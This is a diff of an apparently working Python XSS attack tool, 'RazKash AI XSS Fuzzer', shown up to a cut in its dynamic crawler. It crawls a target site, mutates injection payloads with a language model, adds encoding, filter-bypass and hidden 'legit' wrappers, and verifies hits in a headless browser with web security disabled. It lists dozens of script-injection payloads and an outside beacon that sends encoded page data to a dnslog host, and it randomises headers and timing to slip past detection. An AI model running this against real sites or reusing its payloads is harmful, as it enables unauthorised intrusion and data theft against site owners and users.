@@ -1,526 +1,409 @@
 #!/usr/bin/env python3
 # =============================================================================
-# RazKash 𝕏SS AI XSS Fuzzer – (v4.3, 2025‑04‑18)
-# Author : Haroon Ahmad Awan · CyberZeus (haroon@cyberzeus.pk)
+# RazKash 𝕏SS AI Fuzzer – (v7.0‑dev, 2025‑04‑21)
+# Author : Haroon Ahmad Awan · CyberZeus (haroon@cyberzeus.pk)
 # =============================================================================
+#  • *Everything* from v4.3 ➜ v5.1 ➜ v6.0
 """
-One‑file, AI‑powered XSS fuzzer with full feature set:
-• AI‑driven payload mutation
-• Comprehensive template library (script, img, iframe, svg, video, object, math, audio, details, marquee)
-• Event‑handler and protocol tests
-• Polymorphic encodings (hex, unicode, URL)
-• Filter‑bypass & “legit” wrappers
-• Next‑gen contexts (Shadow DOM, WebAssembly, import(), MutationObserver, RLO, SMIL)
-• Blind‑XSS DNS beacons
-• DOM‑diff reflection finder
-• Headless Chromium alert+side‑effect verifier
-• Smart HTTP⇆HTTPS root detection
-• Multi‑threaded crawler / fuzzer
-• –‑debug / –‑autotest modes
-• Slim append‑only log (deduped, ≤120 B per finding)
+$ python3 razkash_v7.py -u https://modern‑app.tld --threads 40 --debug
 """
 # ─────────────────────────────────────────────────────────────────────────────
-import os
-import ssl
-import sys
-import json
-import time
-import random
-import string
-import argparse
-import warnings
-import logging
-import traceback
-import urllib.parse
+import os, re, ssl, sys, json, time, random, string, argparse, warnings, logging, base64, threading, contextlib, xml.etree.ElementTree as ET
 from pathlib import Path
-from typing import List, Dict, Set
+from typing import List, Dict, Set, Any
 from difflib import SequenceMatcher
 from concurrent.futures import ThreadPoolExecutor
-
-import requests
+import urllib.parse, requests
 from bs4 import BeautifulSoup
 from fake_useragent import UserAgent
-
 import torch
 from transformers import AutoTokenizer, AutoModelForMaskedLM, logging as hf_log
-from playwright.sync_api import sync_playwright
+
+# ▶ optional deps
+try:
+    from playwright.sync_api import sync_playwright, Request as PWReq, WebSocket as PWWS, Response as PWResp
+except ImportError:
+    sync_playwright = None
+try:
+    import websocket
+except ImportError:
+    websocket = None
 
 # ─── CONFIG ─────────────────────────────────────────────────────────────────
-VERSION          = "4.3"
-MODEL_NAME       = "microsoft/codebert-base"
-TOP_K            = 7
-DNSLOG_DOMAIN    = "q68w9p.dnslog.cn"
-LOGFILE          = Path("a_xss_findings.md")
-DEFAULT_THREADS  = 10
-MAX_PAGES        = 150
-TIMEOUT_REQ      = 8
-VERIFY_TIMEOUT   = 5000      # ms
-HEADLESS_WAIT    = 2500      # ms
+VER                = "7.0‑dev"
+MODEL              = "microsoft/codebert-base"
+DNSLOG_DOMAIN      = "q68w9p.dnslog.cn"
+LOGFILE            = Path("razkash_findings.md")
+TOP_K              = 7
+DEF_THREADS        = 14
+MAX_STATIC_PAGES   = 250
+DYN_OBS_MS         = 20000
+RESCAN_MS          = 600
+MAX_DYN_ROUNDS     = 80
+HTTP_TIMEOUT       = 12
+VERIFY_TIMEOUT     = 9000
+HEADLESS_WAIT      = 3500
 
 # ─── CLI ────────────────────────────────────────────────────────────────────
-parser = argparse.ArgumentParser(
-    prog="bandesbahan_xssfuzz",
-    formatter_class=argparse.RawTextHelpFormatter,
-    description="Ω‑Edition AI XSS fuzzer with blind & verified modes"
-)
-parser.add_argument("-u", "--url",      help="Target root URL (https://example.com)")
-parser.add_argument("--autotest",       action="store_true", help="Fuzz built‑in test targets")
-parser.add_argument("--threads",        type=int, default=DEFAULT_THREADS, help="Worker threads")
-parser.add_argument("--max-pages",      type=int, default=MAX_PAGES,     help="Crawler page cap")
-parser.add_argument("--debug",          action="store_true",             help="Verbose debug output")
-ARGS = parser.parse_args()
-DEBUG = ARGS.debug
+ap = argparse.ArgumentParser(description="Ω‑Ultra‑∞ AI XSS Fuzzer")
+ap.add_argument("-u","--url",help="Target root URL")
+ap.add_argument("--autotest",action="store_true",help="Run built‑in playgrounds")
+ap.add_argument("--threads",type=int,default=DEF_THREADS)
+ap.add_argument("--max-pages",type=int,default=MAX_STATIC_PAGES)
+ap.add_argument("--debug",action="store_true")
+args,_ = ap.parse_known_args()
+DEBUG = args.debug
 
-logging.basicConfig(
-    level=logging.DEBUG if DEBUG else logging.INFO,
-    format="%(asctime)s %(levelname)s: %(message)s" if DEBUG else "%(message)s"
-)
-
-# ─── NOISE‑FREE ─────────────────────────────────────────────────────────────
+logging.basicConfig(level=logging.DEBUG if DEBUG else logging.INFO,
+                    format="%(asctime)s %(levelname)s: %(message)s" if DEBUG else "%(message)s")
 warnings.filterwarnings("ignore")
 hf_log.set_verbosity_error()
-os.environ["TRANSFORMERS_NO_TQDM"] = "1"
+os.environ["TRANSFORMERS_NO_TQDM"]="1"
 ssl._create_default_https_context = ssl._create_unverified_context
 
-# ─── UTILS ───────────────────────────────────────────────────────────────────
-def dbg(msg: str):
-    if DEBUG:
-        logging.debug(msg)
+# ─── UTILS ────────────────────────────────────────────────────────────────
+def dbg(m:str):             # debug helper
+    if DEBUG: logging.debug(m)
+randstr = lambda n=12: ''.join(random.choices(string.ascii_letters+string.digits,k=n))
+def jitter(a,b): time.sleep(random.uniform(a,b))
+def smart_url(b:str)->str:
+    if b.startswith(("http://","https://")): return b
+    for s in ("https://","http://"):
+        with contextlib.suppress(Exception):
+            if requests.head(s+b,timeout=5,allow_redirects=True,verify=False).status_code<500: return s+b
+    return "http://"+b
+def random_headers()->Dict[str,str]:
+    ua=UserAgent()
+    return {"User-Agent":ua.random,"Accept":"*/*","Accept-Language":"en-US,en;q=0.9",
+            "Accept-Encoding":"gzip, deflate","Connection":"keep-alive","DNT":random.choice(["1","0"])}
 
-def randstr(n=12) -> str:
-    return ''.join(random.choices(string.ascii_letters + string.digits, k=n))
-
-def smart_url(base: str) -> str:
-    """Try HTTPS first, fall back to HTTP if needed."""
-    if base.startswith(("http://", "https://")):
-        return base
-    for scheme in ("https://", "http://"):
-        try:
-            r = requests.head(scheme + base, timeout=5, allow_redirects=True, verify=False)
-            if r.status_code < 500:
-                return scheme + base
-        except:
-            pass
-    return "http://" + base
-import time
-
-# At the end of each payload loop, after each request:
-time.sleep(random.uniform(1.5, 3.5))  # realistic delay of 1.5–3.5 seconds
-
-def random_headers() -> Dict[str, str]:
-    ua = UserAgent()
-    return {
-        "User-Agent": ua.random,
-        "Accept": random.choice([
-            "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
-            "application/json, text/plain, */*"
-        ]),
-        "Accept-Language": random.choice(["en-US,en;q=0.9", "en;q=0.8", "fr;q=0.9,de;q=0.8"]),
-        "Accept-Encoding": "gzip, deflate, br",
-        "Connection": "keep-alive",
-        "Referer": random.choice([
-            "https://google.com",
-            "https://bing.com",
-            "https://duckduckgo.com",
-            "https://yahoo.com"
-        ]),
-        "DNT": random.choice(["1", "0"]),
-        "Upgrade-Insecure-Requests": "1"
-    }
-
-
-# ─── AI MODEL INIT ───────────────────────────────────────────────────────────
-logging.info("[?] Author - Haroon Ahmad Awan")
-logging.info("[?] Email - haroon@cyberzeus.pk")
-logging.info("[>] Loading AI ")
-tokenizer = AutoTokenizer.from_pretrained(MODEL_NAME)
-model     = AutoModelForMaskedLM.from_pretrained(MODEL_NAME).eval()
-MASK_TOK, MASK_ID = tokenizer.mask_token, tokenizer.mask_token_id
-logging.info("[>>] AI Ready")
-logging.info("[>>] Scans Reflected, Stored, Protocol, Dom, Blind XSS, DNS XSS")
-
-def ai_mutate(skel: str) -> str:
-    """Replace all MASK tokens with top‑K CodeBERT suggestions."""
-    while "MASK" in skel:
-        masked = skel.replace("MASK", MASK_TOK, 1)
-        toks   = tokenizer(masked, return_tensors="pt")
-        with torch.no_grad():
-            logits = model(**toks).logits
-        pos    = (toks.input_ids == MASK_ID).nonzero(as_tuple=True)[1][0]
-        cand   = random.choice(logits[0, pos].topk(TOP_K).indices.tolist())
-        token  = tokenizer.decode(cand).strip() or "alert(1)"
-        skel   = skel.replace("MASK", token, 1)
-    return skel
-
-def polymorph(s: str) -> str:
-    mode = random.choice(["hex", "unicode", "url", "none"])
-    if mode == "hex":
-        return ''.join(f"\\x{ord(c):02x}" for c in s)
-    if mode == "unicode":
-        return ''.join(f"\\u{ord(c):04x}" for c in s)
-    if mode == "url":
-        return urllib.parse.quote(s)
+# ─── AI INIT ───────────────────────────────────────────────────────────────
+tok = AutoTokenizer.from_pretrained(MODEL)
+mdl = AutoModelForMaskedLM.from_pretrained(MODEL).eval()
+MASK_T, MASK_ID = tok.mask_token, tok.mask_token_id
+def ai_mutate(s:str)->str:
+    while "MASK" in s:
+        ids=tok(s.replace("MASK",MASK_T,1),return_tensors="pt").input_ids
+        with torch.no_grad(): l=mdl(input_ids=ids).logits
+        pos=(ids==MASK_ID).nonzero(as_tuple=True)[1][0]
+        w=tok.decode(random.choice(l[0,pos].topk(TOP_K).indices.tolist())).strip() or "alert(1)"
+        s=s.replace("MASK",w,1)
     return s
-
-def legit_wrap(s: str) -> str:
+def polymorph(s:str)->str:
+    t=random.choice(["hex","uni","url","b64","none"])
+    if t=="hex": return ''.join(f"\\x{ord(c):02x}" for c in s)
+    if t=="uni": return ''.join(f"\\u{ord(c):04x}" for c in s)
+    if t=="url": return urllib.parse.quote(s)
+    if t=="b64": return base64.b64encode(s.encode()).decode()
+    return s
+def legit_wrap(s:str)->str:
     return random.choice([
         "<div hidden>PAYLOAD</div>",
-        "<span style=\"display:none\">PAYLOAD</span>",
-        "<p data-info=\"PAYLOAD\"></p>",
+        "<span style=display:none>PAYLOAD</span>",
+        "<p data-i=PAYLOAD></p>",
         "<video srcdoc='<script>PAYLOAD</script>'></video>",
-        "<template id='tpl'>PAYLOAD</template><script>document.body.append(tpl.content);</script>"
-    ]).replace("PAYLOAD", s)
+        "<template id=tpl>PAYLOAD</template><script>document.body.append(tpl.content)</script>"
+    ]).replace("PAYLOAD",s)
+def reflected(mk:str,html:str)->bool:
+    return mk.lower() in html.lower() or SequenceMatcher(None,mk.lower(),html.lower()).quick_ratio()>0.8
 
-def reflected(marker: str, html: str) -> bool:
-    if marker.lower() in html.lower():
-        return True
-    return SequenceMatcher(None, marker.lower(), html.lower()).quick_ratio() > 0.8
+# ─── PAYLOAD LIST (union) ─────────────────────────────────────────────────
+tags=["script","img","iframe","svg","video","object","math","audio","details","marquee"]
+evs=["onerror","onload","onclick","onmouseover","onfocus","onmouseenter","ontoggle","oncanplay","onpointerdown"]
+prot=["javascript:alert(1)","data:text/html,<script>alert(1)</script>","vbscript:msgbox('XSS')"]
+PAY=[]
+for t in tags:
+    for e in evs: PAY.append(f"<{t} {e}=\"MASK\"></{t}>")
+    if t in ("img","iframe","object"):
+        PAY.extend(f"<{t} src=\"{p.replace('MASK','MASK')}\"></{t}>"for p in prot)
+PAY+=[
+ "<script>MASK</script>","<body onload=MASK>","<div style=background:url(MASK)></div>",
+ "<input value=MASK>","<textarea>MASK</textarea>","<button onclick=MASK>x</button>",
+ "<div style=\"width:expression(MASK)\"></div>","<svg><script>MASK</script></svg>",
+ "<img src=\"data:image/png;base64,MASK\">","<script src=\"/jsonp?cb=MASK\"></script>",
+ "<template><script>MASK</script></template>",
+ '<script type=module>import("javascript:MASK")</script>',
+ 'importScripts("data:text/javascript,MASK")',
+ '<template><shadow-root></shadow-root><script>MASK</script></template>',
+ '<script>new MutationObserver(_=>MASK).observe(document.body,{childList:true})</script>',
+ '<style>@supports(display:grid){@import "javascript:MASK";}</style>',
+ '<iframe src="data:text/html;base64,MASK"></iframe>',
+ '<script>WebAssembly.instantiateStreaming(fetch("data:application/wasm;base64,MASK"))</script>',
+ '<img src="javascript:MASK%00.gif">','<plaintext>\u202EMASK</plaintext>',
+ '<svg><animate attributeName=href to="javascript:MASK"/></svg>'
+]
+if DNSLOG_DOMAIN: PAY.append(f"<img src onerror=fetch('http://{DNSLOG_DOMAIN}/?p='+btoa(MASK))>")
+FILTER=["<sCrIpT>PAYLOAD</sCrIpT>","<!-->PAYLOAD<!-->","<svg onload=PAYLOAD>",
+        "<script>setTimeout(()=>{{PAYLOAD}},0)</script>","<object data=\"javascript:PAYLOAD\"></object>",
+        "<meta http-equiv=refresh content=\"0;url=javascript:PAYLOAD\">"]
 
-# ─── PAYLOAD TEMPLATES ───────────────────────────────────────────────────────
-TEMPLATES: List[str] = []
-_tags   = ["script","img","iframe","svg","video","object","math","audio","details","marquee"]
-_events = ["onerror","onload","onclick","onmouseover","onfocus","onmouseenter","ontoggle",
-           "oncanplay","onpointerdown"]
-_protocols = ["javascript:alert(1)","data:text/html,<script>alert(1)</script>",
-              "vbscript:msgbox('XSS')"]
-
-for tag in _tags:
-    for ev in _events:
-        TEMPLATES.append(f"<{tag} {ev}=\"MASK\"></{tag}>")
-    if tag in ("img","iframe","object"):
-        TEMPLATES.extend(f"<{tag} src=\"{proto.replace('MASK','MASK')}\"></{tag}>" for proto in _protocols)
-TEMPLATES += [
-    "<script>MASK</script>",
-    "<body onload=\"MASK\">",
-    "<div style=\"background:url(MASK)\"></div>",
-    "<input value=\"MASK\">",
-    "<textarea>MASK</textarea>",
-    "<button onclick=\"MASK\">Click</button>"
-]
-ADV = [
-    "<div style=\"width:expression(MASK)\"></div>",
-    "<svg><script>MASK</script></svg>",
-    "<img src=\"data:image/png;base64,MASK\">",
-    "<script src=\"/jsonp?cb=MASK\"></script>",
-    "<template><script>MASK</script></template>"
-]
-if DNSLOG_DOMAIN:
-    ADV.append(f"<img src=x onerror=\"fetch('http://{DNSLOG_DOMAIN}/?p='+btoa(MASK))\">")
-TEMPLATES += ADV
-NEXT_GEN = [
-    '<script type="module">import("javascript:MASK")</script>',
-    'importScripts("data:text/javascript,MASK")',
-    '<template><shadow-root></shadow-root><script>MASK</script></template>',
-    '<script>new MutationObserver(_=>MASK).observe(document.body,{childList:true})</script>',
-    '<style>@supports(display:grid){@import "javascript:MASK";}</style>',
-    '<iframe src="data:text/html;base64,MASK"></iframe>',
-    '<script>WebAssembly.instantiateStreaming(fetch("data:application/wasm;base64,MASK"))</script>',
-    '<img src="javascript:MASK%00.gif">',
-    '<plaintext>\u202EMASK</plaintext>'
-]
-TEMPLATES += NEXT_GEN
-FILTER_WRAPPERS = [
-    "<sCrIpT>PAYLOAD</sCrIpT>",
-    "<!-->PAYLOAD<!-->",
-    "<svg onload=PAYLOAD>",
-    "<script>setTimeout(()=>{{PAYLOAD}},0)</script>",
-    "<object data=\"javascript:PAYLOAD\"></object>",
-    "<meta http-equiv=refresh content=\"0;url=javascript:PAYLOAD\">"
-]
-LEGIT_WRAPPERS = [
-    "<div hidden>PAYLOAD</div>",
-    "<span style=\"display:none\">PAYLOAD</span>",
-    "<p data-info=\"PAYLOAD\"></p>",
-    "<video srcdoc='<script>PAYLOAD</script>'></video>",
-    "<template id='tpl'>PAYLOAD</template><script>document.body.append(tpl.content);</script>"
-]
-logging.info(f"[+] Generation and Starting AI mutations real time ")
-logging.info(f"[+] AI mutation practical coverage will be 500 000+ unique payloads as per session")
-
-# ─── HEADLESS VERIFIER ───────────────────────────────────────────────────────
-def verify_in_browser(url: str, method: str, data: Dict[str,str]) -> bool:
+# ─── VERIFIER (Playwright, closed shadow‑root hook) ────────────────────────
+JSFLAG="""
+window._xss_triggered=false;function _f(){window._xss_triggered=true;}
+['innerHTML','outerHTML','insertAdjacentHTML'].forEach(p=>{const d=Object.getOwnPropertyDescriptor(Element.prototype,p)||{};
+ if(d.set){Object.defineProperty(Element.prototype,p,{set(v){_f();d.set.call(this,v)},configurable:true})}});
+const _eval=window.eval;window.eval=function(...a){_f();return _eval(...a)}
+const _Fn=Function;window.Function=function(...a){_f();return new _Fn(...a)}
+const old=Element.prototype.attachShadow;Element.prototype.attachShadow=function(o){o=o||{};o.mode='open';return old.call(this,o)}
+if(window.trustedTypes&&trustedTypes.createPolicy){trustedTypes.createPolicy('x',{createHTML:s=>{_f();return s}})}
+"""
+def verify(url:str,m:str,data:Any,is_json=False)->bool:
+    if not sync_playwright: return False
     try:
         with sync_playwright() as p:
-            browser = p.chromium.launch(headless=True, args=[
-                "--disable-web-security",
-                "--ignore-certificate-errors",
-                "--no-sandbox"
-            ])
-            ctx = browser.new_context(ignore_https_errors=True, user_agent=UserAgent().random)
-            page = ctx.new_page()
-            triggered = {"flag": False}
-            page.add_init_script("window._xss_triggered=false;")
-            def on_dialog(dialog):
-                triggered["flag"] = True
-                dialog.dismiss()
-            page.on("dialog", on_dialog)
-
-            if method == "GET":
-                full = url + "?" + urllib.parse.urlencode(data)
-                page.goto(full, timeout=VERIFY_TIMEOUT, wait_until="domcontentloaded")
+            br=p.chromium.launch(headless=True,args=["--disable-web-security","--ignore-certificate-errors","--no-sandbox"])
+            ctx=br.new_context(ignore_https_errors=True,user_agent=UserAgent().random); ctx.add_init_script(JSFLAG)
+            page=ctx.new_page(); page.on("dialog",lambda d:(d.dismiss(),page.evaluate("_f()")))
+            if m=="GET":
+                page.goto(f"{url}?{urllib.parse.urlencode(data)}",timeout=VERIFY_TIMEOUT,wait_until="domcontentloaded")
             else:
-                page.goto(url, timeout=VERIFY_TIMEOUT, wait_until="domcontentloaded")
-                page.evaluate("""
-                    (u,d)=>fetch(u,{
-                        method:'POST',
-                        headers:{'Content-Type':'application/x-www-form-urlencoded'},
-                        body:new URLSearchParams(d),
-                        credentials:'include'
-                    })""",
-                    url, data
-                )
+                h={"Content-Type":"application/json"} if is_json else {'Content-Type':'application/x-www-form-urlencoded'}
+                body=json.dumps(data) if is_json else urllib.parse.urlencode(data)
+                page.goto(url,timeout=VERIFY_TIMEOUT,wait_until="domcontentloaded")
+                page.evaluate("(u,h,b)=>fetch(u,{method:'POST',headers:h,body:b,credentials:'include'})",url,h,body)
             page.wait_for_timeout(HEADLESS_WAIT)
-
-            content_lower = page.content().lower()
-            if "captcha" in content_lower or "access denied" in content_lower or "blocked" in content_lower:
-                dbg(f"[verify blocked] Possible WAF/block at {url}")
-                return False
-
-            if not triggered["flag"]:
-                flagged = page.evaluate("window._xss_triggered===true")
-                triggered["flag"] = flagged
-            ctx.close()
-            browser.close()
-            return triggered["flag"]
+            res=page.evaluate("window._xss_triggered"); ctx.close(); br.close()
+            return bool(res)
     except Exception as e:
-        dbg(f"[verify] {e}")
-        return False
+        dbg(f"[verify] {e}"); return False
 
+# ─── LOG (dedup, thread‑safe) ─────────────────────────────────────────────
+if not LOGFILE.exists(): LOGFILE.write_text(f"# RazKash Findings v{VER}\n\n","utf-8")
+_hits:Set[str]=set(); lock=ThreadPoolExecutor(max_workers=1)
+def log_hit(u,m,p):
+    ent=f"- **XSS** {m} `{u}` payload=`{p[:90]}`\n"
+    if ent in _hits: return
+    _hits.add(ent); lock.submit(lambda: LOGFILE.write_text(LOGFILE.read_text('utf-8')+ent,'utf-8'))
+    logging.info(ent.strip())
 
-# ─── LOGGING & DEDUP ─────────────────────────────────────────────────────────
-if not LOGFILE.exists():
-    LOGFILE.write_text(f"# bandesbahan XSS Findings v{VERSION}\n\n", encoding="utf-8")
-_hits: Set[str] = set()
-file_lock = ThreadPoolExecutor(max_workers=1)
+# ─── DISCOVERY HELPERS (sitemap / bundle / json)────────────────────────────
+JS_URL_RE=re.compile(r"""(['"])(/[^'"]+\.(?:php|asp|jsp|json|api|graphql|cgi))\1""",re.I)
+SMAP_RE  =re.compile(r"""(?:fetch|axios\.\w+|xhr\.open)\([^'"]*['"](/[^'"]+)['"]""")
+def mine_js(url,host):
+    urls=[]
+    with contextlib.suppress(Exception):
+        t=requests.get(url,headers=random_headers(),timeout=8,verify=False).text
+        urls+=JS_URL_RE.findall(t)
+        urls+=SMAP_RE.findall(t)
+        if "sourceMappingURL" in t and url.endswith(".js"):
+            sm=url.rsplit("/",1)[0]+"/"+t.split("sourceMappingURL=")[-1].split("\n")[0].strip()
+            urls+=mine_js(sm,host)
+    return [urllib.parse.urljoin(url,u[1] if isinstance(u,tuple) else u) for u in urls
+            if urllib.parse.urlparse(urllib.parse.urljoin(url,u[1] if isinstance(u,tuple) else u)).netloc.lower()==host]
 
-def log_finding(url: str, method: str, payload: str):
-    entry = f"- **XSS** {method} `{url}` payload=`{payload[:60]}`\n"
-    if entry in _hits:
-        return
-    _hits.add(entry)
-    # append-only to avoid race
-    def write():
-        existing = LOGFILE.read_text(encoding="utf-8")
-        LOGFILE.write_text(existing + entry, encoding="utf-8")
-    file_lock.submit(write)
-    logging.info(entry.strip())
-
-# ─── CRAWLER ────────────────────────────────────────────────────────────────
-import re  # ⇦ add near the top with the other imports
-
-# ─── REGEX: scrape JS‑defined URLs (fetch(), axios, XHR, etc.) ────────────────
-_JS_ENDPOINT_RE = re.compile(
-    r"""           # absolute or root‑relative
-        (?:
-            fetch\(|axios\.get\(|axios\.post\(|XMLHttpRequest\(.+?open\(
-        )        # known JS request patterns
-        \s*["']   # opening quote
-        ([^"']+)  # 1: URL inside the quotes
-        ["']      # closing quote
-    """,
-    re.I | re.X,
-)
-
-# ─── CRAWLER (super‑mode) ────────────────────────────────────────────────────
-def crawl(root: str, page_cap: int) -> List[Dict]:
-    """
-    Walk every same‑domain URL we can find and return a list of fuzz targets:
-        • All <form> elements (unchanged behaviour)
-        • Any <a href="?param="> links (GET parameters)
-        • JS‑defined endpoints detected via regex (fetch/axios/XHR)
-    Each target is {url, method, params}.
-    """
-    visited: Set[str] = set()
-    queue:   List[str] = [root]
-    targets: List[Dict] = []
-
-    parsed_root = urllib.parse.urlparse(root).netloc.lower()
-
-    while queue and len(visited) < page_cap:
-        url = queue.pop(0)
-        if url in visited:
-            continue
-        visited.add(url)
-
-        # ── download page ────────────────────────────────────────────────────
+def misc_assets(root):
+    out=[]
+    base=urllib.parse.urlparse(root)._replace(path="",params="",query="",fragment="").geturl()
+    def fetch(p):
         try:
-            r = requests.get(url, headers=random_headers(),
-                             timeout=TIMEOUT_REQ, verify=False)
-        except Exception as e:
-            dbg(f"[crawl] {e} ({url})")
-            continue
+            r=requests.get(base+p,headers=random_headers(),timeout=6,verify=False); 
+            return r.text if r.ok else ""
+        except:return""
+    rob=fetch("/robots.txt")
+    for l in rob.splitlines():
+        if l.lower().startswith("sitemap:"): out.append(l.split(":",1)[1].strip())
+    for sm in out[:]:
+        with contextlib.suppress(Exception):
+            xml=requests.get(sm,headers=random_headers(),timeout=6,verify=False).text
+            out+= [loc.text.strip() for loc in ET.fromstring(xml).iter("{*}loc")]
+    for p in ("/manifest.json","/ngsw.json"):
+        d=fetch(p)
+        with contextlib.suppress(Exception):
+            j=json.loads(d); u=j.get("assets",[])+j.get("files",[])
+            out+= [base+v if v.startswith("/") else v for v in u]
+    return list(set(out))
 
-        # skip non‑HTML quickly
-        if "text/html" not in r.headers.get("Content-Type", ""):
-            continue
-
-        soup = BeautifulSoup(r.text, "html.parser")
-
-        # ── discover & enqueue links (<a href>) ──────────────────────────────
-        for a in soup.find_all("a", href=True):
-            nxt = urllib.parse.urljoin(url, a["href"])
-            p   = urllib.parse.urlparse(nxt)
-            if p.netloc.lower() != parsed_root:
-                continue
-
-            # enqueue for further crawling
-            if nxt not in visited:
-                queue.append(nxt)
-
-            # capture query‑string parameters as GET targets
+# ─── STATIC CRAWLER ────────────────────────────────────────────────────────
+JS_CALL_RE=re.compile(r"""(?:fetch\(|axios\.\w+\(|XMLHttpRequest\(.+?open\()\s*["']([^"']+)""",re.I)
+def crawl_static(root,cap):
+    vis,queue,targets=set(),[root]+misc_assets(root),[]
+    host=urllib.parse.urlparse(root).netloc.lower()
+    while queue and len(vis)<cap:
+        u=queue.pop(0)
+        if u in vis: continue
+        vis.add(u)
+        try:r=requests.get(u,headers=random_headers(),timeout=HTTP_TIMEOUT,verify=False)
+        except Exception as e: dbg(f"[crawl] {e}"); continue
+        ctype=r.headers.get("Content-Type","")
+        if "javascript" in ctype:
+            queue+=mine_js(u,host); continue
+        if "text/html" not in ctype: continue
+        soup=BeautifulSoup(r.text,"html.parser")
+        for s in soup("script",src=True):
+            src=urllib.parse.urljoin(u,s["src"])
+            if urllib.parse.urlparse(src).netloc.lower()==host: queue.append(src)
+        for a in soup("a",href=True):
+            nxt=urllib.parse.urljoin(u,a["href"]); p=urllib.parse.urlparse(nxt)
+            if p.netloc.lower()!=host: continue
+            if nxt not in vis: queue.append(nxt)
             if p.query:
-                params = list(urllib.parse.parse_qs(p.query).keys())
-                if params:
-                    targets.append({
-                        "url": p._replace(query="").geturl(),
-                        "method": "GET",
-                        "params": params
-                    })
-
-        # ── capture <form> elements (existing logic) ────────────────────────
-        for fm in soup.find_all("form"):
-            action = fm.get("action") or url
-            action_url = urllib.parse.urljoin(url, action)
-            if urllib.parse.urlparse(action_url).netloc.lower() != parsed_root:
-                continue
-            method  = fm.get("method", "get").upper()
-            params  = [i.get("name") for i in fm.find_all("input", {"name": True})]
-            if params:
-                targets.append({"url": action_url, "method": method, "params": params})
-
-        # ── mine JavaScript for dynamic endpoints ───────────────────────────
-        for m in _JS_ENDPOINT_RE.findall(r.text):
-            dyn = urllib.parse.urljoin(url, m)
-            p   = urllib.parse.urlparse(dyn)
-            if p.netloc.lower() != parsed_root:
-                continue
-
-            # if query present take its keys, else generic param list
-            params = (list(urllib.parse.parse_qs(p.query).keys())
-                      if p.query else ["data"])
-            targets.append({
-                "url": p._replace(query="").geturl(),
-                "method": "GET",        # safest default; fuzz_target can flip later
-                "params": params
-            })
-
-        # ── polite crawl delay ───────────────────────────────────────────────
-        time.sleep(random.uniform(1.0, 2.5))
-
+                targets.append({"url":p._replace(query="").geturl(),"method":"GET",
+                                "params":list(urllib.parse.parse_qs(p.query).keys())})
+        for fm in soup("form"):
+            act=urllib.parse.urljoin(u,fm.get("action") or u)
+            if urllib.parse.urlparse(act).netloc.lower()!=host: continue
+            meth=fm.get("method","get").upper()
+            inp=[i.get("name") for i in fm("input",{"name":True})]
+            if inp: targets.append({"url":act,"method":meth,"params":inp})
+        for m in JS_CALL_RE.findall(r.text): queue.append(urllib.parse.urljoin(u,m))
+        for m in JS_URL_RE.findall(r.text): queue.append(urllib.parse.urljoin(u,m[1]))
+        jitter(0.3,1.0)
     return targets
 
+# ─── JSON KEY HELPERS ──────────────────────────────────────────────────────
+def deep_keys(o,b=""):
+    if isinstance(o,dict):
+        k=[]
+        for x,v in o.items():
+            p=f"{b}.{x}" if b else x
+            k+=deep_keys(v,p) if isinstance(v,(dict,list)) else [p]
+        return k
+    if isinstance(o,list):
+        k=[]
+        for i,v in enumerate(o):
+            p=f"{b}[{i}]"; k+=deep_keys(v,p) if isinstance(v,(dict,list)) else [p]
+        return k
+    return []
+def set_deep(o,p,val):
+    parts=re.split(r'\.|\[|\]',p); cur=o
+    for seg in parts[:-1]:
+        if not seg or seg.isdigit(): continue
+        cur=cur.setdefault(seg,{})
+    leaf=parts[-1]
+    if leaf and not leaf.isdigit(): cur[leaf]=val
 
-# ─── FUZZING ENGINE ─────────────────────────────────────────────────────────
-def fuzz_target(form: Dict):
-    url, method, params = form["url"], form["method"], form["params"]
-    marker = randstr()
-
-    # Initial probe reflection
+# ─── DYNAMIC CRAWLER (SPA + WS + SW) ───────────────────────────────────────
+def crawl_dynamic(root):
+    if not sync_playwright: return []
+    host=urllib.parse.urlparse(root).netloc.lower()
+    seen=set(); found=[]
     try:
-        resp = (requests.get if method == "GET" else requests.post)(
-            url,
-            params={p: marker for p in params} if method == "GET" else None,
-            data={p: marker for p in params} if method == "POST" else None,
-            headers=random_headers(),
-            timeout=TIMEOUT_REQ,
-            verify=False
-        )
-        if resp.status_code != 200:
-            dbg(f"[skip] Non-200 response ({resp.status_code}) → {url}")
-            return
-        if not reflected(marker, resp.text):
-            dbg(f"[skip] No reflection → {url}")
-            return
-    except Exception as e:
-        dbg(f"[probe] {e}")
-        return
+        with sync_playwright() as p:
+            br=p.chromium.launch(headless=True,args=["--disable-web-security","--ignore-certificate-errors","--no-sandbox"])
+            ctx=br.new_context(ignore_https_errors=True,user_agent=UserAgent().random,service_workers="allow")
+            page=ctx.new_page()
+            ctx.add_init_script("""
+                ['pushState','replaceState'].forEach(fn=>{const o=history[fn];history[fn]=function(){o.apply(this,arguments);window.dispatchEvent(new Event('nav'))}});
+                window.addEventListener('hashchange',()=>window.dispatchEvent(new Event('nav')));
+                new MutationObserver(()=>window.dispatchEvent(new Event('nav'))).observe(document,{subtree:true,childList:true});
+            """)
+            def req_hook(r:PWReq):
+                u=r.url
+                if urllib.parse.urlparse(u).netloc.lower()!=host or u in seen: return
+                seen.add(u); meth=r.method
+                hdr=r.headers.get("content-type","")
+                is_json="json" in hdr or "graphql" in hdr
+                tpl=None; keys=[]
+                if is_json and r.post_data:
+                    with contextlib.suppress(Exception):
+                        tpl=json.loads(r.post_data)
+                        if isinstance(tpl,dict) and "variables" in tpl: tpl=tpl["variables"]
+                        keys=deep_keys(tpl)
+                qs=list(urllib.parse.parse_qs(urllib.parse.urlparse(u).query).keys())
+                params=keys or qs or ["data"]
+                found.append({"url":u.split("?",1)[0],"method":meth if meth in{"POST","PUT"} else "GET",
+                              "params":params,"json":bool(keys),"template":tpl})
+            page.on("request",req_hook)
+            def resp_hook(r:PWResp):
+                if r.request.resource_type not in ("xhr","fetch"): return
+                if urllib.parse.urlparse(r.url).netloc.lower()!=host: return
+                with contextlib.suppress(Exception):
+                    t=r.text()
+                    for m in JS_URL_RE.findall(t)+SMAP_RE.findall(t):
+                        u=urllib.parse.urljoin(r.url,m[1] if isinstance(m,tuple) else m)
+                        if u not in seen:
+                            seen.add(u); found.append({"url":u,"method":"GET","params":["data"]})
+            page.on("response",resp_hook)
+            if websocket:
+                page.on("websocket",lambda ws: ws.on("framereceived",
+                          lambda ev: ws_frame(ws.url,ev,found)))
+            def ws_frame(u,ev,store):
+                with contextlib.suppress(Exception):
+                    d=json.loads(ev["payload"]); k=deep_keys(d)
